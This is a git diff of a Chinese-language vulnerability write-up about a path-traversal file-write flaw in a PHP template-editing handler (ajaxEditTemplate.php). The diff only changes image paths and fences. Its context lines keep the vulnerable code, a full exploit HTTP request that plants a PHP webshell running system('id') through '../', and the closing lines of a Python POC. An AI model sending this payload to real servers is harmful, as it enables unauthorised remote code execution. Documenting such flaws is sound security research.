@@ -108,7 +108,7 @@ if (!$session->logged_in) {
     chmod($fullpath, 0444;
 ```
 
-$fileName -->  $fullpath ---> 写入文件，其中 fileName参数 POST传入时没有过滤导致目录可上传任意位置
+$fileName --> $fullpath ---> 写入文件，其中 fileName参数 POST传入时没有过滤导致目录可上传任意位置
 
 ```php
 $ymlData = Spyc::YAMLLoad($_POST['code']);
@@ -122,7 +122,7 @@ $ymlData = Spyc::YAMLLoad($_POST['code']);
     $fullpath = $config_templates_basedir+ .$fileName;
 ```
 
-![](images/202202162243099.png)
+![](../.gitbook/assets/202202162243099.png)
 
 ```php
 $filehandle = fopen($fullpath, 'w+');
@@ -131,7 +131,7 @@ file_put_contents($fullpath, $_POST['code']);
 
 POST code 传参写入文件 test.php.yml, 请求包如下
 
-```plain
+```
 POST /lib/ajaxHandlers/ajaxEditTemplate.php HTTP/1.1
 Host: 
 Cookie: PHPSESSID=fv8j4c6r4gofug1vr9v3efdvj7
@@ -149,11 +149,11 @@ Referer: https://176.62.195.243/lib/ajaxHandlers/ajaxEditTemplate.php
 fileName=../www/test.php&code=<?php echo system('id');?>&id=1
 ```
 
-![](images/202202162243006.png)
+![](../.gitbook/assets/202202162243006.png)
 
 这里写入文件 **test.php.yml**,并使用 **../** 跳出限制的目录，访问 test.php.yml 实际访问了 test.php，执行id命令
 
-![](images/202202162243024.png)
+![](../.gitbook/assets/202202162243024.png)
 
 ## 漏洞POC
 
@@ -257,4 +257,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](images/202202162243541.png)
+![](../.gitbook/assets/202202162243541.png)
